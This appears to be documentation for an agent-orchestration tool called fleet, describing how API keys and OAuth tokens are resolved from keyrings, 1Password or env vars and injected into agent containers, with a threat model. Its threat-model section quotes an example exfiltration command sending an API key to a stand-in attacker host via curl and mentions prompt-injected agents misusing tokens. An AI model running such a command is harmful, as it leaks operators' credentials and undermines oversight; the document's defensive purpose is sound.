# Identity & secrets

This page covers the **identity-brokering** boundary fleet enforces.
Companion documents are [`sandbox.md`](./sandbox.md) for filesystem
isolation and [`network.md`](./network.md) for egress control.

The short version: secrets reach the agent as environment variables on
the container, never as files (modulo a single per-agent bash
trampoline for `claude-code` — see "Special case: claude OAuth"
below). Fleet itself doesn't *store* secrets — they live in the OS
keyring, a 1Password vault, or a host env var, and fleet resolves
them at agent-spawn time.

## How a secret reaches the agent

```
.fleet/config.yaml: secrets.<name>: { backend: …, … }
       │
       │  fleet executor consults this when an agent's env_passthrough
       │  lists <NAME> (matched case-insensitively).
       ▼
SecretBackend::fetch  ──→  keyring / op / env / (host-file fallback)
       │
       │  resolved SecretString
       ▼
container env: <NAME>=<value>
       │
       │  --remote-env to the devcontainer CLI
       ▼
agent process inside the container
```

Resolution order for any env_passthrough name, top wins:

1. **Configured `secrets:` backend** (`.fleet/config.yaml`). If a
   backend is declared and `fetch()` fails, the whole agent node
   fails — fleet refuses to silently fall through to a less-safe
   source. A typo in a 1Password reference is visible immediately.
2. **Host env var** (`std::env::var(<NAME>)`). Useful for CI runners
   where the secret is already an env var of the host process.
3. **Special claude fallback**: for `CLAUDE_CODE_OAUTH_TOKEN` /
   `CLAUDE_OAUTH_TOKEN`, fleet additionally reads
   `~/.claude/.credentials.json` (the file `claude setup-token`
   writes). This is the "I'm running on my own laptop, claude is
   already set up" path — zero fleet config required.

Concretely, given this fragment in `.fleet/config.yaml`:

```yaml
agents:
  registry:
    claude-code:
      command: [bash, -c, "<trampoline that writes ~/.claude/.credentials.json from $CLAUDE_CODE_OAUTH_TOKEN, then exec claude -p $FLEET_PROMPT>"]
      env_passthrough: [ANTHROPIC_API_KEY, CLAUDE_CODE_OAUTH_TOKEN]

secrets:
  claude_code_oauth_token:
    backend: keychain
    service: claude-code-oauth-token
```

When fleet runs a `claude-code` agent node, it:

1. Sees `CLAUDE_CODE_OAUTH_TOKEN` in `env_passthrough`.
2. Looks up `secrets.claude_code_oauth_token` in the config —
   matched case-insensitively.
3. Builds the `keychain` backend and calls `fetch()`. On a
   workstation, that's the macOS Security framework / Linux DBus
   Secret Service. The user stored the value with `fleet secrets
   register claude_code_oauth_token` (or by hand with
   `security add-generic-password` / `secret-tool store`).
4. Injects `CLAUDE_CODE_OAUTH_TOKEN=<token>` into the container env.
5. The agent's bash trampoline materialises
   `~/.claude/.credentials.json` from the env var, then `exec`s
   claude.

If you don't have a `secrets:` block, the same resolution still
works — fleet just falls through to step 2 (host env) or step 3
(host-file fallback for claude). The `secrets:` block is the
upgrade from "plaintext credentials.json on disk" to
"keychain-backed, never-on-disk."

## Configuring backends

The `secrets:` map in `.fleet/config.yaml` takes one of three
backend kinds per entry:

```yaml
secrets:
  # Read from the OS keyring (recommended for workstations).
  claude_code_oauth_token:
    backend: keychain
    service: claude-code-oauth-token
    # account: alice                  # defaults to $USER

  # Read from a host env var (CI runners, scripted setups).
  gh_token:
    backend: env
    var: GH_TOKEN

  # Read from 1Password CLI (shops that already standardise on op).
  sentry_dsn:
    backend: op
    ref: op://Eng/Sentry/dsn
```

Field shapes:

- **`backend: env`** — `var: <NAME>` reads `$NAME` at agent-spawn
  time. Empty string is treated as "not set" and the resolver
  errors.
- **`backend: keychain`** — `service: <name>` is the keyring's
  service identifier (matches `secret-tool store --service` /
  `security … -s`). `account:` defaults to `$USER`.
- **`backend: op`** — `ref:` is a 1Password reference
  (`op://Vault/Item/field`). Calls `op read <ref>`; the user must
  be signed in (`op signin` interactively, or a 1Password service
  account in CI).

## Using `fleet secrets`

The CLI surface around `secrets:` configuration:

- **`fleet secrets register <name>`** — interactive setup. For
  `claude_code_oauth_token`, prints the `claude setup-token`
  instruction; for any other name, prompts for a value. Stores it
  in the OS keyring (service: `<name with underscores→hyphens>`,
  account: `$USER`), then appends the matching `secrets.<name>`
  block to `.fleet/config.yaml`. Idempotent — re-running overwrites.

- **`fleet secrets list`** — prints one row per configured secret:
  `name | backend description | status`. Status is one of `ok`,
  `missing`, or `error: <one-line>`. Doesn't print the value.

- **`fleet secrets test <name>`** — resolves the named secret
  through its configured backend and reports `ok (NN chars)` on
  success or the backend's error on failure. Run after `register`
  to catch misconfigured 1Password references / missing keychain
  entries.

- **`fleet secrets remove <name>`** — strips the `secrets.<name>`
  entry from `.fleet/config.yaml`. The OS keyring entry itself
  stays — delete it via the platform tool (`secret-tool delete`,
  `security delete-generic-password`).

### Special case: claude OAuth

The most common setup is the claude OAuth token. The full
workflow:

```sh
# 1. On the host, get a long-lived OAuth token (bound to your
#    Anthropic account; survives across sessions).
claude setup-token

# 2. Store it in the OS keyring and write the matching secrets:
#    block to .fleet/config.yaml.
fleet secrets register claude_code_oauth_token
# (paste the token from step 1 when prompted)

# 3. Confirm it resolves.
fleet secrets test claude_code_oauth_token
# → ok (NN chars via `keychain` backend)
```

After that, any agent whose `env_passthrough` lists
`CLAUDE_CODE_OAUTH_TOKEN` (the default `claude-code` agent does)
receives the token automatically. The agent's bash trampoline
materialises `~/.claude/.credentials.json` inside the container
from the env var, then exec's `claude -p "$FLEET_PROMPT"`.

If you skip step 2 entirely, the host-file fallback still works
on your laptop — fleet reads `~/.claude/.credentials.json`
directly. Registration is the security upgrade: keychain-backed
instead of plaintext file on disk.

For CI / servers without a graphical keyring, prefer the `env`
backend:

```yaml
secrets:
  claude_code_oauth_token:
    backend: env
    var: CLAUDE_CODE_OAUTH_TOKEN
```

…and provision the env var through your runner's secrets UI.

## What goes into env

Per-node, the executor builds the env list from four sources:

1. The agent registry's `env_passthrough` list, run through the
   secrets resolver above.
2. The persona name (for the agent's system prompt prefix).
3. The prompt artifact path + body (`FLEET_PROMPT_FILE`,
   `FLEET_PROMPT`).
4. The issue context, when one was passed: `FLEET_ISSUE_ID`,
   `FLEET_ISSUE_HUMAN_ID`, `FLEET_ISSUE_TITLE`.

Only the first source carries secrets. The other three are
plain-text routing.

## What's NOT done

- **No automatic rotation.** Fleet reads the value once per
  container start; long-running sessions keep that value for their
  lifetime. Rotating an upstream token requires restarting fleet
  (or finishing the in-flight workflow run, since each agent node
  spawns a fresh container).
- **No secret refresh inside the container.** If the agent's
  request exceeds the token's lifetime, the agent sees the
  upstream's `401` — same as any other long-running client.
- **No file-based secrets injection** beyond the special claude
  trampoline. Some toolchains (Kubernetes, Docker Compose) mount
  secrets as files. Fleet doesn't — secrets are env vars at the
  container boundary. If the agent needs a file (e.g. a GCP service
  account JSON), the user is responsible for committing it inside
  the worktree or writing it to `/artifacts/` before the agent
  starts. Fleet treats `.fleet/` as gitignored by default; secrets
  in `.fleet/config.yaml` would leak — don't put them there.

## Per-tracker auth

Trackers are the only place fleet acts on behalf of the user
against an external service. The auth story is different for each:

### GitHub (`tracker: github`)

Fleet shells `gh issue list --json …` directly from the host. Auth
is whatever `gh auth status` reports — fleet doesn't touch `gh`'s
tokens or refresh state. Your host's `~/.config/gh/hosts.yml` is
consulted.

If `gh` isn't logged in, `fleet issues list` surfaces gh's own
error. Fix it with `gh auth login` on the host.

The container itself never sees the gh token — trackers run host-
side, and agents reach the tracker through the per-session HTTP
bridge (`fleet-tracker` CLI in the container POSTs back to a
loopback listener on the host). So `gh_token` doesn't typically
need a `secrets:` entry; the only case it would is an agent that
wants direct `gh` access for non-tracker operations (e.g. `gh
release create`).

### git-bug (`tracker: git-bug`)

No auth. `git-bug` is a project-local issue tracker; it reads
issue data out of the repo's git refs directly. Anyone who can
clone the repo can list its issues. Fleet's involvement is just
shelling `git-bug bug --format json` and parsing the JSON. `fleet
runtime doctor` surfaces a `✓ git-bug` / `✗ git-bug` line so you
can verify the binary is on PATH before the first `fleet issues
list`.

### Linear / Jira (future)

Not implemented today. The trait shape is open; new tracker
plugins plug into `src/tracker/`.

## Container-internal visibility

Once a secret is in the container's env, the agent process can
read it back via `std::env::var` (or `os.getenv`, or
`process.env`, etc.). This is **by design** — the agent has to use
the secret to make requests. There is no in-container split
between fleet and the agent; the agent *is* the only fleet-spawned
process inside the container.

What this means in practice:

- An agent that maliciously decides to echo `ANTHROPIC_API_KEY`
  to its stdout will succeed. Fleet captures node output to
  `.fleet/sessions/<id>/logs/<node>.log` — keep your `.fleet/`
  gitignored, which `fleet init` does by default.
- An agent that maliciously decides to `curl evil.example.com -d
  $ANTHROPIC_API_KEY` is the case the **egress allowlist** defends
  against. See [`network.md`](./network.md) — the proxy refuses
  CONNECTs to hosts not on the allowlist.
- The agent cannot read another session's env vars. Sessions are
  filesystem- and process-disjoint per-container.

## What this protects against

- Tokens leaking into image layers. Image builds don't see
  `--remote-env` values; they're injected at container start, not
  at build time.
- Tokens persisting in the container filesystem after the agent
  exits. The container's writable layer is reclaimed; nothing
  leaks to the host outside `/workspace` (the agent's own
  checkout) and `/artifacts` (the agent's declared outputs).
- Tokens persisting on the host filesystem as plaintext. With a
  `keychain` or `op` backend, the value lives in the OS keyring /
  1Password vault — never in `.fleet/config.yaml`, never in a
  dotfile. (Exception: the claude host-file fallback reads
  `~/.claude/.credentials.json`; that file's lifecycle is owned
  by `claude setup-token`, not fleet.)
- The host's `gh` / git auth state being silently mutated by what
  the agent does. The agent never sees the host's `~/.config/gh/`.
  Token rotation stays a host concern.
- One session leaking secrets to another. Each session runs in
  its own container with its own env.

## What it does NOT protect against

- **An agent that wants to leak its own secrets.** As above — the
  agent has to read them to use them; preventing it from echoing
  them is out of scope. The egress allowlist is the real defence;
  the identity boundary just keeps secrets from sticking to the
  filesystem.
- **A prompt-injected agent that uses the secret for legitimate-
  looking calls to the LLM provider's API.** Anthropic billing
  has no way to tell "agent was tricked into running a million
  tokens" from "user asked the agent to run a million tokens."
  Set spend alerts on your provider account. Fleet's opt-in cost
  budgets (`cost.per_session_budget_usd` /
  `cost.lifetime_budget_usd` in `.fleet/config.yaml`) refuse to
  spawn new agent nodes once the limit is hit; in-flight agents
  complete. Honest scope: no projection — fleet counts reported
  cost after each agent finishes and the next spawn checks the
  totals.
- **Host-side credential exfil before fleet starts.** If the
  attacker has read access to your shell's env / OS keyring at
  the point you run fleet, they already have your secrets. The
  identity model assumes your host environment is yours.

## Operations

**See which env vars an agent spec passes through.**

```sh
grep -A4 'registry:' .fleet/config.yaml
```

`env_passthrough` is the load-bearing line. If your agent isn't
getting a secret it needs, that's the first thing to check.

**Confirm a configured secret resolves.**

```sh
fleet secrets test claude_code_oauth_token
# → ok (123 chars via `keychain` backend)
```

If it errors, the message names the backend kind and the
actionable next step (e.g. "no entry in OS keyring for service
`claude-code-oauth-token` account `alice` — run `fleet secrets
register claude_code_oauth_token` to set it up").

**See all configured secrets at a glance.**

```sh
fleet secrets list
# name                       backend                            status
# -------------------------  ---------------------------------  ------
# claude_code_oauth_token    keychain claude-code-oauth-token   ok
# gh_token                   env GH_TOKEN                       missing
```

**Verify a secret reached the container.**

```sh
fleet runtime exec -- env | grep -E '^(ANTHROPIC|CLAUDE|OPENAI|GH_|FLEET_ISSUE)'
```

Lists every env var that crossed the boundary. If you don't see
your var here but you do on the host / in the keychain, the
agent's `env_passthrough` likely doesn't include it.
